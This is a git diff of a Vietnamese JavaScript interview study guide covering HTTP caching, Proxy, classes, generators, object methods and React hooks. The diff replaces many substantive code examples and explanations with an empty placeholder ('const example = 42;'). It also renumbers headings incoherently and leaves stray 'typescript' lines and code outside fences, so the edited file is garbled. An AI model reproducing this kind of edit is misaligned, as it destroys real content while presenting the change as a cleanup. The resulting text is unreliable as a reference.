-       if (order.userId === user.id) {
-       }
-     }
-   }
-
- // Chú giải: ✅ GOOD: O(n) với Map
-   const ordersByUser = new Map();
-   orders.forEach((order) => {
-     if (!ordersByUser.has(order.userId)) {
-       ordersByUser.set(order.userId, []);
-     }
-     ordersByUser.get(order.userId).push(order);
-   });
-
-   users.forEach((user) => {
-     const userOrders = ordersByUser.get(user.id); // Chú giải: O(1)
-   });
-   ```
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 5. **❌ Promise.all mà không handle errors**
 
-   ```typescript
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-   await Promise.all(items.map((item) => fetchData(item)));
-
-   // ✅ GOOD: Dùng Promise.allSettled
-   const results = await Promise.allSettled(
-     items.map((item) => fetchData(item))
-   );
-
-   results.forEach((result, i) => {
-     if (result.status === 'rejected') {
-       console.error(`Item ${i} failed:`, result.reason);
-     }
-   });
-   ```
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 ---
 ---
-## 20. 💾 Q20: Handle Caching - HTTP Caching & Browser Cache Strategies  
 
-**P1: Tên câu hỏi:** 💾 Q20: Handle Caching - HTTP Caching & Browser Cache Strategies  
+## 39. Q39: 💾 Q20: Handle Caching - HTTP Caching & Browser Cache Strategies
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 💾 Q20: Handle Caching - HTTP Caching & Browser Cache Strategies
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 40. Q40: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
 
@@ -8872,24 +3058,24 @@ loopControl();
 **♻️ Chiến Lược Cache (Service Worker):**
 
 1. **Cache First (Tài nguyên tĩnh)**:
-   - Kiểm tra cache → nếu có trả về → nếu không lấy từ mạng.
-   - ✅ Dùng cho: Fonts, hình ảnh, CSS, JS có tên file phiên bản.
+- Kiểm tra cache → nếu có trả về → nếu không lấy từ mạng.
+- ✅ Dùng cho: Fonts, hình ảnh, CSS, JS có tên file phiên bản.
 
 2. **Network First (Dữ liệu động)**:
-   - Lấy từ mạng → nếu thất bại trả về cache.
-   - ✅ Dùng cho: Dữ liệu API, nội dung người dùng.
+- Lấy từ mạng → nếu thất bại trả về cache.
+- ✅ Dùng cho: Dữ liệu API, nội dung người dùng.
 
 3. **Stale While Revalidate**:
-   - Trả về cache ngay (nhanh) + lấy mạng background → cập nhật cache.
-   - ✅ Dùng cho: Cân bằng tốc độ + độ mới (nguồn tin, mạng xã hội).
+- Trả về cache ngay (nhanh) + lấy mạng background → cập nhật cache.
+- ✅ Dùng cho: Cân bằng tốc độ + độ mới (nguồn tin, mạng xã hội).
 
 4. **Network Only**:
-   - Luôn lấy từ mạng → không cache.
-   - ✅ Dùng cho: Phân tích, dữ liệu thời gian thực.
+- Luôn lấy từ mạng → không cache.
+- ✅ Dùng cho: Phân tích, dữ liệu thời gian thực.
 
 5. **Cache Only**:
-   - Chỉ dùng cache → ưu tiên offline.
-   - ✅ Dùng cho: Vỏ ứng dụng PWA.
+- Chỉ dùng cache → ưu tiên offline.
+- ✅ Dùng cho: Vỏ ứng dụng PWA.
 
 **🔍 ETag & Conditional Requests:**
 - **ETag**: Hash của resource content → version identifier.
@@ -8902,7 +3088,7 @@ loopControl();
 
 **⚠️ Common Pitfalls:**
 - **Cache Busting**: Static assets thay đổi nhưng cùng filename → browser serve stale cache.
-  - **Solution**: Hash trong filename (`app.abc123.js`) hoặc query param (`app.js?v=123`).
+- **Solution**: Hash trong filename (`app.abc123.js`) hoặc query param (`app.js?v=123`).
 - **Over-caching**: Cache sensitive data (passwords) → security risk. Dùng `no-store`.
 - **Under-caching**: Không cache static assets → waste bandwidth, slow load.
 - **CDN cache**: Purge CDN cache khi deploy new version.
@@ -8942,377 +3128,32 @@ loopControl();
 
 **🎯 HTTP Cache Headers & Directives:**
 
-```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                     HTTP CACHE ARCHITECTURE                              │
-├─────────────────────────────────────────────────────────────────────────┤
-│                                                                          │
-│  1️⃣  BROWSER CACHE (Memory + Disk)                                     │
-│      ┌─────────────────────────────────────────────────────────┐       │
-│      │  📦 Cache-Control: max-age=3600 (1 hour)               │       │
-│      │  📦 Cache-Control: public/private                       │       │
-│      │  📦 Cache-Control: no-cache/no-store                    │       │
-│      │  📦 ETag: "abc123" (version tag)                        │       │
-│      │  📦 Last-Modified: Thu, 01 Jan 2024 00:00:00 GMT        │       │
-│      └─────────────────────────────────────────────────────────┘       │
-│                                                                          │
-│  2️⃣  SERVICE WORKER CACHE                                              │
-│      ┌─────────────────────────────────────────────────────────┐       │
-│      │  🚀 Cache First (Static Assets)                         │       │
-│      │  🌐 Network First (Dynamic Data)                        │       │
-│      │  ⚡ Stale While Revalidate (Balance)                    │       │
-│      │  📱 Cache Only (Offline First)                          │       │
-│      └─────────────────────────────────────────────────────────┘       │
-│                                                                          │
-│  3️⃣  CDN CACHE (Edge Servers)                                          │
-│      ┌─────────────────────────────────────────────────────────┐       │
-│      │  🌍 Cloudflare, AWS CloudFront, Fastly                  │       │
-│      │  📡 Geographic distribution                             │       │
-│      │  ⚡ Edge caching for static assets                      │       │
-│      └─────────────────────────────────────────────────────────┘       │
-│                                                                          │
-│  4️⃣  APPLICATION CACHE (LocalStorage, IndexedDB)                       │
-│      ┌─────────────────────────────────────────────────────────┐       │
-│      │  💾 localStorage (5-10MB, synchronous)                  │       │
-│      │  💾 sessionStorage (per-tab)                            │       │
-│      │  💾 IndexedDB (large data, async)                       │       │
-│      └─────────────────────────────────────────────────────────┘       │
-└─────────────────────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Code Example:**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: 1. HTTP CACHE HEADERS - Server-Side Setup
- // Chú giải: ============================================
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
- // Chú giải: Express.js example - Setting cache headers
-import express, { Request, Response } from 'express';
-import path from 'path';
-
-const app = express();
-
-// 🔥 Static Assets - Long-term caching (1 năm)
-// Cho các file có hash trong tên: app.abc123.js
-app.use(
-  '/static',
-  express.static('public', {
-    maxAge: '365d', // Cache 1 năm
-    immutable: true, // Báo browser file này không bao giờ thay đổi
-    setHeaders: (res: Response, filePath: string) => {
-      // Set cache headers chi tiết
-      res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
-      res.setHeader('Vary', 'Accept-Encoding'); // Cache riêng cho gzip/brotli
-    },
-  })
-);
-
-// 🎯 HTML Files - No cache (luôn kiểm tra mới nhất)
-app.get('*.html', (req: Request, res: Response) => {
-  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-  res.setHeader('Pragma', 'no-cache'); // Chú giải: HTTP/1.0 backward compatibility
-  res.setHeader('Expires', '0'); // Chú giải: Legacy browsers
-  res.sendFile(path.join(__dirname, 'public', req.path));
-});
-
-// ⚡ API Responses - Short-term caching (5 phút)
-app.get('/api/data', (req: Request, res: Response) => {
-  const data = { message: 'Hello World', timestamp: Date.now() };
-
-  // Cache 5 phút, nhưng revalidate với server
-  res.setHeader('Cache-Control', 'public, max-age=300, must-revalidate');
-
-  // ETag để conditional requests
-  const etag = generateETag(data); // Chú giải: Hash của data
-  res.setHeader('ETag', etag);
-
- // Chú giải: Last-Modified header
-  res.setHeader('Last-Modified', new Date().toUTCString());
-
-  // Kiểm tra If-None-Match header (ETag matching)
-  if (req.headers['if-none-match'] === etag) {
-    // Data không đổi → 304 Not Modified (không gửi body)
-    return res.status(304).end();
-  }
-
-  res.json(data);
-});
-
- // Chú giải: 📦 Images - Medium-term caching (1 tuần)
-app.use('/images', (req: Request, res: Response, next) => {
-  res.setHeader('Cache-Control', 'public, max-age=604800'); // Chú giải: 7 days
-  res.setHeader('Vary', 'Accept'); // Cache riêng cho WebP/JPEG
-  next();
-});
-
- // Chú giải: ============================================
- // Chú giải: 2. ETAG GENERATION (Tạo Version Tag)
- // Chú giải: ============================================
-
-import crypto from 'crypto';
-
-function generateETag(data: any): string {
-  // Hash nội dung để tạo ETag unique
-  const hash = crypto
-    .createHash('md5')
-    .update(JSON.stringify(data))
-    .digest('hex');
-
-  return `"${hash}"`; // Chú giải: ETag format: "abc123"
-}
-
- // Chú giải: Sử dụng ETag cho conditional requests
-async function fetchWithETag(url: string, cachedETag?: string): Promise<any> {
-  const headers: HeadersInit = {};
-
-  // Gửi ETag đã cache để kiểm tra
-  if (cachedETag) {
-    headers['If-None-Match'] = cachedETag;
-  }
-
-  const response = await fetch(url, { headers });
-
-  // 304 Not Modified → Dùng cached data
-  if (response.status === 304) {
-    console.log('✅ Sử dụng cached data (304 Not Modified)');
-    return null; // Không có data mới
-  }
-
- // Chú giải: 200 OK → Data mới, lưu ETag
-  const newETag = response.headers.get('ETag');
-  const data = await response.json();
-
-  console.log('📥 Data mới, lưu ETag:', newETag);
-
-  return { data, etag: newETag };
-}
-
- // Chú giải: ============================================
- // Chú giải: 3. BROWSER CACHE API - Client-Side Caching
- // Chú giải: ============================================
-
- // Chú giải: 🔥 Cache Manager Class
-class CacheManager {
-  private cacheName = 'my-app-cache-v1';
-
-  // Lưu response vào cache
-  async cacheResponse(url: string, response: Response): Promise<void> {
-    try {
-      const cache = await caches.open(this.cacheName);
-
-      // Clone response vì response.body chỉ đọc được 1 lần
-      await cache.put(url, response.clone());
-
-      console.log(`✅ Cached: ${url}`);
-    } catch (error) {
-      console.error('❌ Cache error:', error);
-    }
-  }
-
- // Chú giải: Lấy response từ cache
-  async getCachedResponse(url: string): Promise<Response | undefined> {
-    try {
-      const cache = await caches.open(this.cacheName);
-      const cachedResponse = await cache.match(url);
-
-      if (cachedResponse) {
-        console.log(`✅ Cache hit: ${url}`);
-        return cachedResponse;
-      }
-
-      console.log(`❌ Cache miss: ${url}`);
-      return undefined;
-    } catch (error) {
-      console.error('❌ Cache read error:', error);
-      return undefined;
-    }
-  }
-
-  // Xóa cache cũ
-  async clearOldCaches(): Promise<void> {
-    const cacheNames = await caches.keys();
-
-    await Promise.all(
-      cacheNames.map((name) => {
-        // Xóa cache không phải version hiện tại
-        if (name !== this.cacheName) {
-          console.log(`🗑️ Deleting old cache: ${name}`);
-          return caches.delete(name);
-        }
-      })
-    );
-  }
-
-  // Cache nhiều URLs cùng lúc
-  async cacheUrls(urls: string[]): Promise<void> {
-    const cache = await caches.open(this.cacheName);
-    await cache.addAll(urls); // Tự động fetch và cache
-    console.log(`✅ Cached ${urls.length} URLs`);
-  }
-}
-
- // Chú giải: Sử dụng Cache Manager
-const cacheManager = new CacheManager();
-
- // Chú giải: Fetch với cache fallback
-async function fetchWithCache(url: string): Promise<any> {
-  try {
-    // 1. Kiểm tra cache trước
-    const cachedResponse = await cacheManager.getCachedResponse(url);
-
-    if (cachedResponse) {
-      return await cachedResponse.json();
-    }
-
- // Chú giải: 2. Cache miss → Fetch từ network
-    const response = await fetch(url);
-
-    // 3. Lưu vào cache cho lần sau
-    await cacheManager.cacheResponse(url, response);
-
-    return await response.json();
-  } catch (error) {
-    console.error('❌ Fetch error:', error);
-    throw error;
-  }
-}
-
----
----
-## 21. 🪞 Q21: JavaScript Proxy - Chi Tiết & Use Cases Thực Tế  
-
-**P1: Tên câu hỏi:** 🪞 Q21: JavaScript Proxy - Chi Tiết & Use Cases Thực Tế  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
-
-**"Proxy là tính năng lập trình meta cho phép chặn và tùy chỉnh hành vi của các thao tác trên object.**
-
-**📦 Khái Niệm Cốt Lõi:**
-- **Cú pháp**: `new Proxy(target, handler)` → Bọc object với hành vi tùy chỉnh.
-- **Handler Traps (Bẫy)**: 13 bẫy để chặn các thao tác (get, set, has, deleteProperty, apply, construct, v.v.).
-- **Reflect API**: API đồng hành cung cấp hành vi mặc định → dùng trong bẫy để chuyển tiếp thao tác đúng cách.
-- **Trong suốt**: Proxy hoàn toàn trong suốt → code sử dụng không biết đang dùng proxy.
-
-**🔧 13 Bẫy Proxy (Quan Trọng Nhất):**
-1. **`get(target, property, receiver)`**: Chặn truy cập thuộc tính → validation, logging, lazy loading.
-2. **`set(target, property, value, receiver)`**: Chặn gán giá trị → validation, reactivity (Vue, MobX).
-3. **`has(target, property)`**: Chặn toán tử `in` → ẩn thuộc tính.
-4. **`deleteProperty(target, property)`**: Chặn `delete` → ngăn xóa.
-5. **`apply(target, thisArg, args)`**: Chặn gọi hàm → logging, giới hạn tần suất.
-6. **`construct(target, args, newTarget)`**: Chặn toán tử `new` → singleton pattern.
-7. **`getPrototypeOf()`, `setPrototypeOf()`**: Chặn truy cập chuỗi prototype.
-8. **`defineProperty()`, `getOwnPropertyDescriptor()`**: Chặn định nghĩa thuộc tính.
-9. **`ownKeys()`**: Chặn `Object.keys()`, `for...in` → lọc keys.
-10. **`preventExtensions()`, `isExtensible()`**: Chặn tính mở rộng.
-
-**🎯 Trường Hợp Sử Dụng Thực Tế:**
-- **Validation (Xác thực)**: Tự động validate khi gán thuộc tính → xác thực form, kiểm tra kiểu dữ liệu.
-- **Reactivity (Phản ứng - Vue 3)**: Proxy bọc state → theo dõi phụ thuộc → tự động render lại.
-- **Logging/Debugging**: Ghi log mọi truy cập/sửa đổi thuộc tính → audit trail.
-- **API Mocking**: Bọc API client → tự động thử lại, cache, xử lý lỗi.
-- **React Hook Form**: Proxy bọc form state → theo dõi fields bị thay đổi, validate khi thay đổi.
-- **Lazy Loading**: Truy cập thuộc tính kích hoạt tải bất đồng bộ → tối ưu kích thước bundle.
-- **Kiểm soát truy cập**: Chặn truy cập thuộc tính không được phép → bảo mật.
-
-**🔍 Cơ Chế React Hook Form (Chi Tiết):**
-```typescript
+typescript
 // RHF dùng Proxy để:
 1. **Theo dõi đăng ký field**: bẫy get → tự động đăng ký field khi truy cập.
 2. **Validate khi thay đổi**: bẫy set → kích hoạt validation khi setValue.
 3. **Theo dõi trạng thái dirty**: So sánh proxy state với giá trị mặc định.
 4. **Hỗ trợ object lồng nhau**: Proxy đệ quy cho nested fields.
 5. **Hiệu năng**: Chỉ render lại fields bị thay đổi (reactivity chi tiết).
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Đánh Đổi Hiệu Năng:**
-- **Chi phí thêm**: Mỗi thao tác có thêm lời gọi hàm → chậm hơn ~10-20%.
-- **Bộ nhớ**: Proxy object + handler object → tăng sử dụng bộ nhớ.
-- **Tối ưu hóa**: V8 không tối ưu được proxy như plain objects.
-- **Thực hành tốt**: Chỉ dùng khi cần metaprogramming, tránh lạm dụng.
-
-**💡 Kiến Thức Senior:**
-- **Reflect vs Truy cập trực tiếp**: Luôn dùng `Reflect.get/set` trong bẫy → đúng hành vi với kế thừa.
-- **Revocable Proxy**: `Proxy.revocable()` → tạo proxy có thể vô hiệu hóa (bảo mật, cleanup).
-- **Proxy vs Object.defineProperty**: Proxy mạnh hơn (chặn 13 thao tác vs 1), nhưng không hỗ trợ IE11.
-- **Vue 2 vs Vue 3**: Vue 2 dùng `Object.defineProperty` → không phát hiện thay đổi mảng. Vue 3 dùng Proxy → phát hiện tất cả.
-- **Debugging**: Proxy khó debug → dùng `console.log` trong bẫy hoặc `Proxy.revocable` để vô hiệu.
-
----
----
-## 22. 🏛️ Q22: JavaScript Classes  
-
-**P1: Tên câu hỏi:** 🏛️ Q22: JavaScript Classes  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
-
-**"ES6 Classes là syntactic sugar trên prototype-based inheritance, cung cấp cleaner syntax cho constructor functions, inheritance, và encapsulation."**
-
-**🔑 4 Khái Niệm Chính:**
-
-**1. Class Basics:**
-- Syntax: `class Person { constructor(name) { this.name = name } method() {} }`
-- **Syntactic sugar** trên constructor functions + prototypes
-- `new` keyword bắt buộc (không như functions)
-- Methods tự động **non-enumerable**
-
-**2. Inheritance (`extends`):**
-- `class Child extends Parent` - kế thừa prototype chain
-- **`super()`** bắt buộc trong constructor (call parent constructor)
-- `super.method()` - gọi parent methods
-- Method overriding: child method override parent cùng tên
-
-**3. Static Methods/Properties:**
-- `static method()` - class-level, **không cần instance**
-- Call trực tiếp: `Person.staticMethod()`
-- Use case: utility functions, factory methods (`Array.from()`, `Object.keys()`)
-
-**4. Private Fields (ES2022):**
-- `#privateField` - truly private (không access từ ngoài)
-- Khác `_convention` (chỉ là naming, vẫn access được)
-
-**⚠️ Lỗi Thường Gặp:**
-- Quên `super()` trong child constructor → ReferenceError
-- Dùng arrow functions cho methods → `this` binding issues
-- Pass method as callback mà không bind → `this` = undefined
-- Nghĩ class tạo scope mới → Sai! Chỉ là syntax sugar
-
-**💡 Kiến Thức Senior:**
-- **Classes ARE functions**: `typeof MyClass === 'function'`
-- **Hoisting difference**: Class declarations **không hoist** (TDZ), function declarations hoist
-- **`this` binding**: Class methods không auto-bind `this` → dùng arrow functions hoặc `.bind()` trong constructor
-- **Mixins pattern**: Combine multiple classes với `Object.assign(MyClass.prototype, Mixin)`
-- Composition > Inheritance (prefer "has-a" over "is-a" relationships)
-
-
-
-
-**⚡ Quick Summary:**
-> ES6 Classes = syntactic sugar over prototypes. constructor, methods, static, inheritance
-
-**💡 Ghi Nhớ:**
-- 🏗️ **Class**: `class Name { constructor() {} method() {} }`
-- 🔗 **Extends**: `class Child extends Parent { super() }`
-- 📌 **Static**: Class-level methods, không cần instance
-
-**Trả lời:**
-
-- **Classes**: Syntactic sugar cho constructor functions
-- **Hoạt động**: Tạo objects với methods và properties
-- **Ưu điểm**: Cleaner syntax, inheritance, encapsulation
-- **Nhược điểm**: Có thể gây confusion với this binding
-
-**Code Example:**
-
-```typescript
+typescript
  // Chú giải: Basic class
 class Person {
   name: string;
@@ -9397,85 +3238,13 @@ const circle = new Circle(5);
 console.log(circle.area); // Chú giải: 78.54
 circle.radius = 10;
 console.log(circle.area); // Chú giải: 314.16
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices:**
-
-- Sử dụng classes cho object-oriented programming
-- Sử dụng inheritance khi cần
-- Sử dụng static methods cho utility functions
-- Sử dụng getters/setters cho data validation
----
-## 23. 🔄 Q23: Generator Functions & Async Generators  
-
-**P1: Tên câu hỏi:** 🔄 Q23: Generator Functions & Async Generators  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
-
-**"Generators (function*) là functions có thể pause/resume execution với `yield`, trả về iterator. Async generators kết hợp với async/await cho lazy async iteration."**
-
-**🔑 3 Khái Niệm Chính:**
-
-**1. Generator Functions:**
-- Syntax: `function* gen() { yield 1; yield 2; }`
-- **Pause execution** tại `yield`, resume với `.next()`
-- Return **Iterator object** `{value, done}`
-- Lazy evaluation - chỉ compute khi `.next()` được gọi
-
-**2. Generator Methods:**
-- `.next(value)` - resume, pass value vào yield expression
-- `.return(value)` - terminate generator, set done=true
-- `.throw(error)` - throw error tại yield statement
-- `yield*` - delegate tới generator khác
-
-**3. Async Generators:**
-- Syntax: `async function* gen() { yield await fetch() }`
-- Iterate với **`for await...of`**
-- Use case: stream data (paginated API, file reading chunks, SSE)
-
-**⚠️ Lỗi Thường Gặp:**
-- Quên `*` trong `function*` → không phải generator
-- Dùng arrow functions → **Không support** generators (`() =>*` invalid)
-- Iterate generator nhiều lần → chỉ chạy 1 lần (exhausted), phải tạo mới
-- `return` trong generator → set done=true nhưng `for...of` không nhận return value
-
-**💡 Kiến Thức Senior:**
-- **Use cases**:
-  - **Infinite sequences**: `function* fibonacci() { let [a,b]=[0,1]; while(true) yield [a,b]=[b,a+b] }`
-  - **Lazy evaluation**: chỉ compute khi cện (memory efficient)
-  - **State machines**: pause/resume cho complex flows
-  - **Co-routines**: bi-directional communication (pass values vào `yield`)
-- **Redux-Saga** dùng generators cho side effects management
-- **Async iteration protocol**: `Symbol.asyncIterator` cho custom async iterables
-- Generators **không thể arrow functions** vì cần `this` binding
-
-
-
-
-**⚡ Quick Summary:**
-> Generator = function* với yield. Pause/resume execution. Async generator = for await...of
-
-**💡 Ghi Nhớ:**
-- ⏸️ **function***: Generator function với yield
-- ▶️ **next()**: Resume execution, return {value, done}
-- 🔄 **Async Gen**: async function* với for await...of
-
-**Trả lời:**
-
-- **Generator Functions**: Functions có thể pause và resume execution
-- **yield**: Keyword để pause function và return value
-- **yield\***: Delegate to another generator
-- **Async Generators**: Generators với async/await support
-- **Ưu điểm**: Memory efficient, lazy evaluation, complex iteration
-- **Nhược điểm**: Complex syntax, not widely used
-
-**Code Example:**
-
-```typescript
+typescript
  // Chú giải: Basic Generator Function
 function* numberGenerator(): Generator<number, void, unknown> {
   yield 1;
@@ -9589,18 +3358,13 @@ console.log(fib.next().value); // Chú giải: 1
 console.log(fib.next().value); // Chú giải: 1
 console.log(fib.next().value); // Chú giải: 2
 console.log(fib.next().value); // Chú giải: 3
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices:**
-
-- Sử dụng generators cho lazy evaluation
-- Sử dụng async generators cho data streaming
-- Sử dụng yield\* cho generator composition
-- Sử dụng for...of với generators
-
-**Mistakes:**
-
-```typescript
+typescript
 // ❌ Sai: Không hiểu generator state
 const gen = numberGenerator();
 console.log(gen.next()); // Chú giải: { value: 1, done: false }
@@ -9611,78 +3375,13 @@ console.log(gen.next()); // Chú giải: { value: 2, done: false }
 const gen = numberGenerator();
 const values = [...gen]; // Chú giải: [1, 2, 3]
  // Chú giải: Generator is exhausted after iteration
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
----
-## 24. 🛠️ Q24: Advanced Array & Object Methods, Object Concepts & Immutability  
 
-**P1: Tên câu hỏi:** 🛠️ Q24: Advanced Array & Object Methods, Object Concepts & Immutability  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"Advanced methods bao gồm flat/flatMap, Array.from, Object.entries/values/keys; Object concepts gồm prototype chain, Object.create, property descriptors; Immutability control với freeze/seal/preventExtensions."**
-
-**🔑 3 Nhóm Chính:**
-
-**1. Advanced Array Methods:**
-- **`flat(depth)`**: Flatten nested arrays - `[1,[2,[3]]].flat(2)` → `[1,2,3]`
-- **`flatMap(fn)`**: map + flatten (efficient hơn `.map().flat()`)
-- **`Array.from(iterable, mapFn)`**: Tạo array từ iterable + optional map
-  - Ví dụ: `Array.from({length: 5}, (_, i) => i)` → `[0,1,2,3,4]`
-- **`entries/keys/values`**: Iterate index-value pairs
-
-**2. Advanced Object Methods:**
-- **`Object.entries(obj)`**: `{a:1, b:2}` → `[['a',1], ['b',2]]` (iterate objects)
-- **`Object.fromEntries()`**: Ngược lại entries → object
-- **`Object.values(obj)`**: Lấy một values (không cần keys)
-- **`Object.assign(target, ...sources)`**: Shallow merge (mutate target)
-
-**3. Object Concepts & Immutability:**
-- **`Object.create(proto)`**: Tạo object với specific prototype (không inherit Object.prototype)
-- **`Object.freeze(obj)`**: **Deep immutable** - không thể add/delete/modify properties
-- **`Object.seal(obj)`**: Không add/delete nhưng **vẫn modify** được values
-- **`Object.preventExtensions(obj)`**: Chỉ không add properties mới
-- **Property Descriptors**: `Object.defineProperty()` - control writable, enumerable, configurable
-
-**⚠️ Lỗi Thường Gặp:**
-- `Object.freeze()` chỉ **shallow** → nested objects vẫn mutable (dùng deep-freeze libraries)
-- `Object.assign()` **mutate target** → dùng `{...obj1, ...obj2}` cho immutable merge
-- `.flat()` không specify depth → default = 1 (không flatten hết)
-- Dùng `for...in` iterate object mà không check `hasOwnProperty` → iterate cả prototype
-
-**💡 Kiến Thức Senior:**
-- **Prototype chain**: `obj.__proto__` (deprecated) vs `Object.getPrototypeOf(obj)`
-- **Mixins pattern**: `Object.assign(MyClass.prototype, Mixin1, Mixin2)` - share behavior
-- **Property descriptors**: `{value, writable, enumerable, configurable}` - fine-grained control
-  - `Object.keys()` chỉ lấy enumerable properties
-- **Immutability libraries**: Immer (structural sharing), Immutable.js (persistent data structures)
-- **Performance**: `Object.create(null)` nhanh hơn `{}` (không có prototype overhead)
-
-
-
-
-**Trả lời:**
-
-**Part 1: Advanced Array & Object Methods**
-- **Advanced Array Methods**: flat, flatMap, from, of, entries, values, keys
-- **Advanced Object Methods**: Object.assign, Object.entries, Object.values, Object.keys
-
-**Part 2: Advanced Object Concepts**
-- **Object.create()**: Tạo object với specific prototype
-- **Prototype Chain**: Mechanism cho inheritance
-- **Mixin Pattern**: Share functionality between objects
-- **Object.freeze/seal/preventExtensions**: Control object mutability
-- **Property Descriptors**: Fine-grained property control
-
-**Ưu điểm**: Powerful manipulation, flexible inheritance, immutability control
-**Nhược điểm**: Complex prototype chain, browser compatibility, learning curve
-
-**Code Example:**
-
-```typescript
+typescript
  // Chú giải: Array.flat() - Flatten nested arrays
 const nestedArray = [1, [2, 3], [4, [5, 6]]];
 const flattened = nestedArray.flat(); // Chú giải: [1, 2, 3, 4, [5, 6]]
@@ -9792,32 +3491,26 @@ function createIndexMap(data: any[]): Map<string, any[]> {
 
   return indexMap;
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices:**
-
-- Sử dụng flat() cho nested arrays
-- Sử dụng flatMap() cho map và flatten
-- Sử dụng Object.entries() cho iteration
-- Sử dụng Object.assign() cho object merging
-- Sử dụng Array.from() cho array creation
-
-**Mistakes - Array Methods:**
-
-```typescript
+typescript
 // ❌ Sai: Không hiểu flat depth
 const nested = [1, [2, [3, [4]]]];
 const flattened = nested.flat(); // Chú giải: [1, 2, [3, [4]]] - only 1 level
 
 // ✅ Đúng: Specify depth
 const deeplyFlattened = nested.flat(Infinity); // Chú giải: [1, 2, 3, 4]
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Part 2: Advanced Object Concepts - Prototype, Inheritance & Immutability**
-
-**Code Example - Object.create() & Prototype Chain:**
-
-```typescript
+typescript
  // Nguyên mẫu (prototype): cơ chế kế thừa theo chuỗi trong JS; `class` chỉ là cú pháp sugar trên prototype.
 const personPrototype = {
   greet(): string {
@@ -10017,20 +3710,13 @@ withLogging(User.prototype);
 
 const user = new User('John');
 user.log('Hello'); // Chú giải: "John: Hello"
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices - Combined:**
-
-- **Array Methods**: Sử dụng flat() cho nested arrays, flatMap() cho map và flatten
-- **Object Methods**: Sử dụng Object.entries() cho iteration, Object.assign() cho merging
-- **Prototype**: Sử dụng Object.create() cho prototype-based inheritance
-- **Mixins**: Sử dụng mixins cho functionality sharing
-- **Immutability**: Sử dụng Object.freeze() cho immutability, Object.seal() cho controlled mutability
-- **Property Descriptors**: Sử dụng proper property descriptors cho fine-grained control
-
-**Mistakes - Object Concepts:**
-
-```typescript
+typescript
 // ❌ Sai: Không hiểu shallow vs deep freeze
 const obj = Object.freeze({ a: { b: 1 } });
 obj.a.b = 2; // Chú giải: Still works!
@@ -10038,103 +3724,13 @@ obj.a.b = 2; // Chú giải: Still works!
 // ✅ Đúng: Deep freeze
 const obj = deepFreeze({ a: { b: 1 } });
 obj.a.b = 2; // Chú giải: Error in strict mode
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
----
-## 25. ⚛️ Q25: React Hooks & Advanced Patterns - Lifecycle, Performance, Architecture  
-
-**P1: Tên câu hỏi:** ⚛️ Q25: React Hooks & Advanced Patterns - Lifecycle, Performance, Architecture  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"React Hooks thay thế Class Components với API sạch hơn và tái sử dụng tốt hơn.**
-
-**🪝 Hooks Cốt Lõi (Bắt Buộc Biết):**
-1. **useState**: Quản lý state. Cập nhật theo hàm `setState(prev => prev + 1)` tránh closure cũ.
-2. **useEffect**: Hiệu ứng phụ, vòng đời. Hàm cleanup ngăn rò rỉ bộ nhớ. Mảng phụ thuộc kiểm soát chạy lại.
-3. **useRef**: Giá trị thay đổi được nhưng không gây render lại. Truy cập DOM, lưu giá trị trước, timers.
-4. **useMemo**: Cache tính toán nặng. Chỉ tính lại khi dependencies thay đổi.
-5. **useCallback**: Cache tham chiếu hàm. Ngăn component con render lại khi truyền callbacks.
-6. **useContext**: Truy cập giá trị Context. Tránh prop drilling.
-7. **useReducer**: Logic state phức tạp. Thay thế useState khi có nhiều giá trị phụ.
-
-**🔄 Ánh Xạ Vòng Đời (Class → Hooks):**
-- **componentDidMount**: `useEffect(() => {}, [])`
-- **componentDidUpdate**: `useEffect(() => {}, [deps])`
-- **componentWillUnmount**: `useEffect(() => { return cleanup }, [])`
-- **getDerivedStateFromProps**: `useMemo(() => compute(props), [props])`
-- **shouldComponentUpdate**: `React.memo()` + `useMemo/useCallback`
-
-**⚙️ Virtual DOM và Reconciliation:**
-- **Virtual DOM**: Biểu diễn cây trong bộ nhớ → thuật toán so sánh nhanh.
-- **Reconciliation**: So sánh VDOM cũ vs mới → cập nhật DOM tối thiểu.
